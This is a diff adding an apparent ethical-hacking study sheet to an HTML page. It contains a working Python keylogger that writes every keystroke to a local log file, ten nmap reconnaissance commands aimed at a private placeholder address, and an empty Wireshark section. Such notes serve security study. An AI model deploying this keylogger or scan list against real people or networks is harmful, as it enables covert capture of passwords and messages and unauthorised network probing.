@@ -6,6 +6,41 @@
     <title>EH - All codes here</title>
 </head>
 <body>
-    
+    <pre id="keywords">
+1. Create a simple keylogger using python/ other technology = kl
+2. 10 nmap commands = nmap
+3. 10 Wireshark commands = ws
+    </pre>
+    <pre id="kl">
+from pynput.keyboard import Key, Listener
+import logging
+# if no name it gets into an empty string
+log_dir = ""
+# This is a basic logging function
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:')
+# This is from the library
+def on_press(key):
+    logging.info(str(key))
+# This says, listener is on
+with Listener(on_press=on_press) as listener:
+    listener.join()        
+    </pre>
+    <pre id="nmap">
+Replace IP address from the actual host IP (IP here is 192.168.1.100)
+
+nmap 192.168.1.100
+nmap -sS 192.168.1.100
+nmap -sU 192.168.1.100
+nmap -A 192.168.1.100
+nmap -p 22,80,443 192.168.1.100
+nmap 192.168.1.100 192.168.1.101 192.168.1.102
+nmap -sn 192.168.1.0/24
+nmap -v 192.168.1.100
+nmap -sV 192.168.1.100
+nmap -O 192.168.1.100
+    </pre>
+    <pre id="ws">
+
+    </pre>
 </body>
 </html>
